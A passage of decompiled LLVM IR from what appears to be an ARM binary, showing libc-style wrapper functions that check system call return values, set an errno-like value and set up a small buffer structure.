  br label %dec_label_pc_b87c

dec_label_pc_b830:                                ; preds = %dec_label_pc_b7e4, %bb
  %v0_b830 = call i32 @function_e9c8()
  %v0_b834 = load i32, i32* @r7, align 4
  store i32 %v0_b834, i32* @r1, align 4
  store i32 %v0_b830, i32* %r6.global-to-local, align 4
  %v0_b840 = load i32, i32* @r5, align 4
  store i32 %v0_b840, i32* %r0.global-to-local, align 4
  store i32 %v0_b840, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_b840, -4095
  br i1 %tmp15, label %dec_label_pc_b870, label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b830
  %v1_b85c = sub i32 0, %v0_b840
  %v0_b860 = call i32 @function_f150()
  store i32 %v0_b860, i32* %r0.global-to-local, align 4
  %v3_b864 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b864 = sext i16 %v3_b864 to i32
  store i32 %v4_b864, i32* @r3, align 4
  %v3_b868 = add i32 %v4_b864, %v0_b860
  %v4_b868 = inttoptr i32 %v3_b868 to i32*
  store i32 %v1_b85c, i32* %v4_b868, align 4
  store i32 -1, i32* @r2, align 4
  %v0_b870.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b870

dec_label_pc_b870:                                ; preds = %dec_label_pc_b830, %dec_label_pc_b858
  %v0_b874 = phi i32 [ %v0_b840, %dec_label_pc_b830 ], [ -1, %dec_label_pc_b858 ]
  %v0_b870 = phi i32 [ %v0_b830, %dec_label_pc_b830 ], [ %v0_b870.pre, %dec_label_pc_b858 ]
  store i32 %v0_b870, i32* %r0.global-to-local, align 4
  store i32 %v0_b874, i32* @r7, align 4
  %v1_b878 = call i32 @function_e940(i32 %v0_b870)
  store i32 %v1_b878, i32* %r0.global-to-local, align 4
  %v0_b87c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b87c

dec_label_pc_b87c:                                ; preds = %dec_label_pc_b828, %dec_label_pc_b870
  %v0_b87c = phi i32 [ %v0_b828, %dec_label_pc_b828 ], [ %v0_b87c.pre, %dec_label_pc_b870 ]
  store i32 %v0_b87c, i32* %r0.global-to-local, align 4
  %v2_b884 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_b884, i32* @r4, align 4
  store i32 %v6_b7b0, i32* @r5, align 4
  store i32 %v12_b7b0, i32* @r7, align 4
  ret i32 %v0_b87c

; uselistorder directives
  uselistorder i32 %v0_b87c, { 1, 0 }
  uselistorder i32 %v0_b870, { 1, 0 }
  uselistorder i32 %v0_b840, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_b7d4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 5, 3, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_b87c, { 1, 0 }
  uselistorder label %dec_label_pc_b870, { 1, 0 }
  uselistorder label %dec_label_pc_b830, { 1, 0 }
  uselistorder label %dec_label_pc_b828, { 1, 0 }
}

define i32 @function_b8a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_b8a0:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b8a0 = load i32, i32* @r7, align 4
  store i32 %v3_b8a0, i32* %stack_var_-8, align 4
  %v0_b8ac = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b8ac, -4095
  br i1 %tmp, label %dec_label_pc_b8cc, label %dec_label_pc_b8b4

dec_label_pc_b8b4:                                ; preds = %dec_label_pc_b8a0
  %v1_b8b8 = sub i32 0, %v0_b8ac
  %v3_b8bc = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b8bc = sext i16 %v3_b8bc to i32
  %v0_b8c0 = call i32 @function_f150()
  %v3_b8c4 = add i32 %v4_b8bc, %v0_b8c0
  %v4_b8c4 = inttoptr i32 %v3_b8c4 to i32*
  store i32 %v1_b8b8, i32* %v4_b8c4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b8cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b8cc

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b8a0, %dec_label_pc_b8b4
  %v1_b8d0 = phi i32 [ %v0_b8ac, %dec_label_pc_b8a0 ], [ -1, %dec_label_pc_b8b4 ]
  %v2_b8cc = phi i32 [ %v3_b8a0, %dec_label_pc_b8a0 ], [ %v2_b8cc.pre, %dec_label_pc_b8b4 ]
  store i32 %v2_b8cc, i32* @r7, align 4
  ret i32 %v1_b8d0

; uselistorder directives
  uselistorder i32 %v0_b8ac, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b8cc, { 1, 0 }
}

define i32 @function_b8d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_b8d8:
  %stack_var_-16 = alloca i32, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_b8e8 = call i32 @function_b918(i32 7, i32 %v2_b8dc)
  %v1_b8ec = icmp slt i32 %v2_b8e8, 0
  %v5_b8f0 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_b8ec, i32 256, i32 %v5_b8f0
  ret i32 %storemerge
}

define i32 @function_b904() local_unnamed_addr {
dec_label_pc_b904:
  %v1_b914 = load i32, i32* @r0, align 4
  ret i32 %v1_b914
}

define i32 @function_b918(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b918:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_b944, label %dec_label_pc_b92c

dec_label_pc_b92c:                                ; preds = %dec_label_pc_b918
  %v1_b930 = sub i32 0, %arg1
  %v3_b934 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b934 = sext i16 %v3_b934 to i32
  %v0_b938 = call i32 @function_f150()
  %v3_b93c = add i32 %v4_b934, %v0_b938
  %v4_b93c = inttoptr i32 %v3_b93c to i32*
  store i32 %v1_b930, i32* %v4_b93c, align 4
  br label %dec_label_pc_b944

dec_label_pc_b944:                                ; preds = %dec_label_pc_b918, %dec_label_pc_b92c
  %v1_b948 = phi i32 [ %arg1, %dec_label_pc_b918 ], [ -1, %dec_label_pc_b92c ]
  ret i32 %v1_b948

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b944, { 1, 0 }
}

define i32 @function_b950(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b950:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b950 = load i32, i32* @r7, align 4
  store i32 %v3_b950, i32* %stack_var_-8, align 4
  %v0_b95c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b95c, -4095
  br i1 %tmp, label %dec_label_pc_b97c, label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_b950
  %v1_b968 = sub i32 0, %v0_b95c
  %v3_b96c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b96c = sext i16 %v3_b96c to i32
  %v0_b970 = call i32 @function_f150()
  %v3_b974 = add i32 %v4_b96c, %v0_b970
  %v4_b974 = inttoptr i32 %v3_b974 to i32*
  store i32 %v1_b968, i32* %v4_b974, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b97c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b950, %dec_label_pc_b964
  %v1_b980 = phi i32 [ %v0_b95c, %dec_label_pc_b950 ], [ -1, %dec_label_pc_b964 ]
  %v2_b97c = phi i32 [ %v3_b950, %dec_label_pc_b950 ], [ %v2_b97c.pre, %dec_label_pc_b964 ]
  store i32 %v2_b97c, i32* @r7, align 4
  ret i32 %v1_b980

; uselistorder directives
  uselistorder i32 %v0_b95c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
}

define i32 @function_b988(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b988:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b988 = load i32, i32* @r7, align 4
  store i32 %v3_b988, i32* %stack_var_-8, align 4
  %v0_b994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b994, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b994, -4095
  br i1 %tmp, label %dec_label_pc_b9bc, label %dec_label_pc_b9a4

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b988
  %v0_b9a8 = call i32 @function_f150()
  %v3_b9ac = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b9ac = sext i16 %v3_b9ac to i32
  %v0_b9b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9b0 = sub i32 0, %v0_b9b0
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v3_b9b4 = add i32 %v4_b9ac, %v0_b9a8
  %v4_b9b4 = inttoptr i32 %v3_b9b4 to i32*
  store i32 %v1_b9b0, i32* %v4_b9b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b9bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b9bc

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b988, %dec_label_pc_b9a4
  %v1_b9c0 = phi i32 [ %v0_b994, %dec_label_pc_b988 ], [ -1, %dec_label_pc_b9a4 ]
  %v2_b9bc = phi i32 [ %v3_b988, %dec_label_pc_b988 ], [ %v2_b9bc.pre, %dec_label_pc_b9a4 ]
  store i32 %v2_b9bc, i32* @r7, align 4
  ret i32 %v1_b9c0

; uselistorder directives
  uselistorder i32 %v0_b994, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b9bc, { 1, 0 }
}

define i32 @function_b9c8() local_unnamed_addr {
dec_label_pc_b9c8:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b9c8 = load i32, i32* @r4, align 4
  store i32 %v3_b9c8, i32* %stack_var_-12, align 4
  %v0_b9d8 = load i32, i32* @r0, align 4
  store i32 %v0_b9d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b9d8, -4095
  br i1 %tmp, label %dec_label_pc_ba00, label %dec_label_pc_b9e8

dec_label_pc_b9e8:                                ; preds = %dec_label_pc_b9c8
  %v0_b9ec = call i32 @function_f150()
  %v3_b9f0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b9f0 = sext i16 %v3_b9f0 to i32
  %v0_b9f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9f4 = sub i32 0, %v0_b9f4
  store i32 %v1_b9f4, i32* %r2.global-to-local, align 4
  %v3_b9f8 = add i32 %v4_b9f0, %v0_b9ec
  %v4_b9f8 = inttoptr i32 %v3_b9f8 to i32*
  store i32 %v1_b9f4, i32* %v4_b9f8, align 4
  %v2_ba00.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ba00

dec_label_pc_ba00:                                ; preds = %dec_label_pc_b9c8, %dec_label_pc_b9e8
  %v1_ba04 = phi i32 [ %v0_b9d8, %dec_label_pc_b9c8 ], [ -1, %dec_label_pc_b9e8 ]
  %v2_ba00 = phi i32 [ %v3_b9c8, %dec_label_pc_b9c8 ], [ %v2_ba00.pre, %dec_label_pc_b9e8 ]
  store i32 %v2_ba00, i32* @r4, align 4
  ret i32 %v1_ba04

; uselistorder directives
  uselistorder i32 %v0_b9d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
}

define i32 @function_ba0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_ba0c:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ba0c = load i32, i32* @r4, align 4
  store i32 %v3_ba0c, i32* %stack_var_-28, align 4
  %v6_ba0c = load i32, i32* @r5, align 4
  %v9_ba0c = load i32, i32* @r6, align 4
  %v12_ba0c = load i32, i32* @r7, align 4
  %v15_ba0c = load i32, i32* @r8, align 4
  %v18_ba0c = load i32, i32* @sl, align 4
  %v21_ba0c = load i32, i32* @lr, align 4
  %v4_ba1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_ba24 = icmp eq i32 %v4_ba1c, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_ba24, label %dec_label_pc_ba40, label %dec_label_pc_ba0c.dec_label_pc_ba4c_crit_edge

dec_label_pc_ba0c.dec_label_pc_ba4c_crit_edge:    ; preds = %dec_label_pc_ba0c
  br label %dec_label_pc_ba4c

dec_label_pc_ba40:                                ; preds = %dec_label_pc_ba0c
  store i32 %v3_ba0c, i32* @r4, align 4
  store i32 %v9_ba0c, i32* @r6, align 4
  store i32 %v12_ba0c, i32* @r7, align 4
  store i32 %v15_ba0c, i32* @r8, align 4
  store i32 %v18_ba0c, i32* %sl.global-to-local, align 4
  %v0_ba48 = call i32 @function_b9c8()
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba0c.dec_label_pc_ba4c_crit_edge, %dec_label_pc_ba40
  %v0_ba4c = call i32 @function_e9c8()
  %v0_ba50 = load i32, i32* @r6, align 4
  store i32 %v0_ba50, i32* @r1, align 4
  store i32 %v0_ba4c, i32* @r5, align 4
  %v0_ba60 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ba60, i32* @r0, align 4
  %v0_ba68 = call i32 @function_b9c8()
  store i32 %v0_ba68, i32* @r4, align 4
  %v0_ba70 = load i32, i32* @r5, align 4
  %v1_ba74 = call i32 @function_e940(i32 %v0_ba70)
  %v0_ba78 = load i32, i32* @r4, align 4
  %v2_ba80 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ba80, i32* @r4, align 4
  store i32 %v6_ba0c, i32* @r5, align 4
  store i32 %v9_ba0c, i32* @r6, align 4
  store i32 %v12_ba0c, i32* @r7, align 4
  store i32 %v15_ba0c, i32* @r8, align 4
  store i32 %v18_ba0c, i32* @sl, align 4
  store i32 %v21_ba0c, i32* @lr, align 4
  ret i32 %v0_ba78

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
}

define i32 @function_ba90(i32 %arg1) local_unnamed_addr {
dec_label_pc_ba90:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ba90 = load i32, i32* @r7, align 4
  store i32 %v3_ba90, i32* %stack_var_-8, align 4
  %v0_ba9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ba9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ba9c, -4095
  br i1 %tmp, label %dec_label_pc_bac4, label %dec_label_pc_baac

dec_label_pc_baac:                                ; preds = %dec_label_pc_ba90
  %v0_bab0 = call i32 @function_f150()
  %v3_bab4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bab4 = sext i16 %v3_bab4 to i32
  %v0_bab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bab8 = sub i32 0, %v0_bab8
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v3_babc = add i32 %v4_bab4, %v0_bab0
  %v4_babc = inttoptr i32 %v3_babc to i32*
  store i32 %v1_bab8, i32* %v4_babc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_bac4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_bac4

dec_label_pc_bac4:                                ; preds = %dec_label_pc_ba90, %dec_label_pc_baac
  %v1_bac8 = phi i32 [ %v0_ba9c, %dec_label_pc_ba90 ], [ -1, %dec_label_pc_baac ]
  %v2_bac4 = phi i32 [ %v3_ba90, %dec_label_pc_ba90 ], [ %v2_bac4.pre, %dec_label_pc_baac ]
  store i32 %v2_bac4, i32* @r7, align 4
  ret i32 %v1_bac8

; uselistorder directives
  uselistorder i32 %v0_ba9c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bac4, { 1, 0 }
}

define i32 @function_bad0(i32* %arg1) local_unnamed_addr {
dec_label_pc_bad0:
  %stack_var_-16 = alloca i32, align 4
  %v2_bad4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_bae4 = call i32 @function_f370(i32 %v2_bad4, i32 0)
  %v2_bae8 = load i32, i32* %stack_var_-16, align 4
  %v2_baec = icmp eq i32* %arg1, null
  br i1 %v2_baec, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_bad0
  store i32 %v2_bae8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_bad0, %bb
  ret i32 %v2_bae8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_bb00(i32 %arg1) local_unnamed_addr {
dec_label_pc_bb00:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bb00 = load i32, i32* @r7, align 4
  store i32 %v3_bb00, i32* %stack_var_-8, align 4
  %v0_bb0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bb0c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_bb0c, -4095
  br i1 %tmp, label %dec_label_pc_bb34, label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bb00
  %v0_bb20 = call i32 @function_f150()
  %v3_bb24 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bb24 = sext i16 %v3_bb24 to i32
  %v0_bb28 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb28 = sub i32 0, %v0_bb28
  store i32 %v1_bb28, i32* %r2.global-to-local, align 4
  %v3_bb2c = add i32 %v4_bb24, %v0_bb20
  %v4_bb2c = inttoptr i32 %v3_bb2c to i32*
  store i32 %v1_bb28, i32* %v4_bb2c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_bb34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_bb34

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bb00, %dec_label_pc_bb1c
  %v1_bb38 = phi i32 [ %v0_bb0c, %dec_label_pc_bb00 ], [ -1, %dec_label_pc_bb1c ]
  %v2_bb34 = phi i32 [ %v3_bb00, %dec_label_pc_bb00 ], [ %v2_bb34.pre, %dec_label_pc_bb1c ]
  store i32 %v2_bb34, i32* @r7, align 4
  ret i32 %v1_bb38

; uselistorder directives
  uselistorder i32 %v0_bb0c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bb34, { 1, 0 }
}

define i32 @function_bb40(i32* %arg1) local_unnamed_addr {
dec_label_pc_bb40:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_bb40 = load i32, i32* @r4, align 4
  store i32 %v3_bb40, i32* %stack_var_-24, align 4
  %v9_bb40 = load i32, i32* @r6, align 4
  %v12_bb40 = load i32, i32* @r7, align 4
  %v15_bb40 = load i32, i32* @r8, align 4
  %v18_bb40 = load i32, i32* @lr, align 4
  %v2_bb44 = load i32, i32* %arg1, align 4
  store i32 %v2_bb44, i32* %r3.global-to-local, align 4
  %v3_bb4c = icmp eq i32 %v2_bb44, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
  br i1 %v3_bb4c, label %dec_label_pc_bb60, label %dec_label_pc_bb7c

dec_label_pc_bb60:                                ; preds = %dec_label_pc_bb40
  store i32 71528, i32* %r2.global-to-local, align 4
  %v0_bb64 = call i32 @function_f150()
  %v3_bb68 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bb68 = sext i16 %v3_bb68 to i32
  store i32 %v4_bb68, i32* %r2.global-to-local, align 4
  %v0_bb6c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_bb6c, i32* %r1.global-to-local, align 4
  %v1_bb70 = add i32 %v0_bb6c, 10
  store i32 %v1_bb70, i32* %r3.global-to-local, align 4
  %v3_bb74 = add i32 %v4_bb68, %v0_bb64
  %v4_bb74 = inttoptr i32 %v3_bb74 to i32*
  store i32 %v1_bb70, i32* %v4_bb74, align 4
  %v0_bc24.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bb7c:                                ; preds = %dec_label_pc_bb40
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_bb80 = add i32 %tmp, 24
  store i32 %v1_bb80, i32* %r2.global-to-local, align 4
  %v4_bb88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), align 4
  store i32 %v4_bb88, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_bb94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_bb94)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_bbac = load i32, i32* @r6, align 4
  %v2_bbac = add i32 %v0_bbac, 16
  %v3_bbac = inttoptr i32 %v2_bbac to i32*
  %v4_bbac = load i32, i32* %v3_bbac, align 4
  call void @__pseudo_branch(i32 %v4_bbac)
  %v0_bbb8 = load i32, i32* @r7, align 4
  %v1_bbb8 = inttoptr i32 %v0_bbb8 to i32*
  %v2_bbb8 = load i32, i32* %v1_bbb8, align 4
  store i32 %v2_bbb8, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_bbc8 = load i32, i32* @r8, align 4
  store i32 %v0_bbc8, i32* %v1_bbb8, align 4
  %v0_bbcc = load i32, i32* @r6, align 4
  %v1_bbcc = load i32, i32* %r3.global-to-local, align 4
  %v2_bbcc = add i32 %v1_bbcc, %v0_bbcc
  %v3_bbcc = inttoptr i32 %v2_bbcc to i32*
  %v4_bbcc = load i32, i32* %v3_bbcc, align 4
  store i32 ptrtoint (i32* @global_var_bbd8.232 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_bbcc)
  %v0_bbd8 = load i32, i32* @r7, align 4
  %v1_bbd8 = add i32 %v0_bbd8, 12
  %v2_bbd8 = inttoptr i32 %v1_bbd8 to i32*
  %v3_bbd8 = load i32, i32* %v2_bbd8, align 4
  store i32 %v3_bbd8, i32* @r0, align 4
  %v0_bbdc = call i32 @function_d458()
  %v0_bbe0 = load i32, i32* @r7, align 4
  store i32 %v0_bbe0, i32* @r0, align 4
  %v0_bbe4 = call i32 @function_d458()
  %v0_bbec = load i32, i32* @r4, align 4
  store i32 %v0_bbec, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_bbec, -4095
  br i1 %tmp11, label %dec_label_pc_bc20, label %dec_label_pc_bc08

dec_label_pc_bc08:                                ; preds = %dec_label_pc_bb7c
  store i32 71360, i32* %r3.global-to-local, align 4
  %v0_bc0c = call i32 @function_f150()
  %v3_bc10 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bc10 = sext i16 %v3_bc10 to i32
  store i32 %v4_bc10, i32* %r3.global-to-local, align 4
  %v0_bc14 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc14 = sub i32 0, %v0_bc14
  store i32 %v1_bc14, i32* %r2.global-to-local, align 4
  %v3_bc18 = add i32 %v4_bc10, %v0_bc0c
  %v4_bc18 = inttoptr i32 %v3_bc18 to i32*
  store i32 %v1_bc14, i32* %v4_bc18, align 4
  %v0_bc1c = load i32, i32* @r8, align 4
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bb7c, %dec_label_pc_bc08
  %v0_bc20 = phi i32 [ %v0_bbec, %dec_label_pc_bb7c ], [ %v0_bc1c, %dec_label_pc_bc08 ]
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_bb60, %dec_label_pc_bc20
  %v0_bc24 = phi i32 [ %v0_bc24.pre, %dec_label_pc_bb60 ], [ %v0_bc20, %dec_label_pc_bc20 ]
  %v2_bc2c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_bc2c, i32* @r4, align 4
  store i32 %v9_bb40, i32* @r6, align 4
  store i32 %v12_bb40, i32* @r7, align 4
  store i32 %v15_bb40, i32* @r8, align 4
  store i32 %v18_bb40, i32* @lr, align 4
  ret i32 %v0_bc24

; uselistorder directives
  uselistorder i32 %v0_bbec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bc24, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
}

define i32 @function_bc3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_bc3c:
  %v0_bc3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bc3c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_bc3c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_bc3c, %bb
  %v7_bc4c = phi i32 [ %arg1, %dec_label_pc_bc3c ], [ 0, %bb ]
  ret i32 %v7_bc4c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_bc50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_bc50:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_bc50 = load i32, i32* @r4, align 4
  %v6_bc50 = load i32, i32* @r5, align 4
  %v9_bc50 = load i32, i32* @r6, align 4
  %v12_bc50 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_bc64 = call i32 @function_c77c(i32 48)
  %v2_bc6c = icmp eq i32 %v1_bc64, 0
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
  br i1 %v2_bc6c, label %bb, label %dec_label_pc_bc7c

bb:                                               ; preds = %dec_label_pc_bc50
  br label %dec_label_pc_bd08

dec_label_pc_bc7c:                                ; preds = %dec_label_pc_bc50
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc80 = load i32, i32* @r4, align 4
  %v2_bc80 = icmp ugt i32 %v0_bc80, 511
  %v2_bc84 = add i32 %v1_bc64, 4
  %v3_bc84 = inttoptr i32 %v2_bc84 to i32*
  store i32 0, i32* %v3_bc84, align 4
  %v0_bc88 = load i32, i32* %r3.global-to-local, align 4
  %v2_bc88 = add i32 %v1_bc64, 16
  %v3_bc88 = inttoptr i32 %v2_bc88 to i32*
  store i32 %v0_bc88, i32* %v3_bc88, align 4
  %v0_bc8c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc8c = add i32 %v1_bc64, 8
  %v3_bc8c = inttoptr i32 %v2_bc8c to i32*
  store i32 %v0_bc8c, i32* %v3_bc8c, align 4
  br i1 %v2_bc80, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_bc7c
  %v0_bc942 = load i32, i32* @r4, align 4
  %v2_bc943 = add i32 %v1_bc64, 20
  %v3_bc944 = inttoptr i32 %v2_bc943 to i32*
  store i32 %v0_bc942, i32* %v3_bc944, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_bc7c
  %v1_bc90 = load i32, i32* %r3.global-to-local, align 4
  %v2_bc90 = add i32 %v1_bc90, 512
  store i32 %v2_bc90, i32* %r3.global-to-local, align 4
  %v0_bc94 = load i32, i32* @r4, align 4
  %v2_bc94 = add i32 %v1_bc64, 20
  %v3_bc94 = inttoptr i32 %v2_bc94 to i32*
  store i32 %v0_bc94, i32* %v3_bc94, align 4
  %v1_bc98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_bc98, i32* %v3_bc94, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_bc64, i32* @r5, align 4
  %v0_bca0 = load i32, i32* @r7, align 4
  %v2_bca0 = inttoptr i32 %v1_bc64 to i32*
  store i32 %v0_bca0, i32* %v2_bca0, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  %v1_bca4 = add i32 %v0_bca4, 20
  %v2_bca4 = inttoptr i32 %v1_bca4 to i32*
  %v3_bca4 = load i32, i32* %v2_bca4, align 4
  store i32 %v3_bca4, i32* %r1.global-to-local, align 4
  %v2_bcac = call i32 @function_d0b4(i32 1, i32 %v3_bca4)
  %v2_bcb0 = icmp eq i32 %v2_bcac, 0
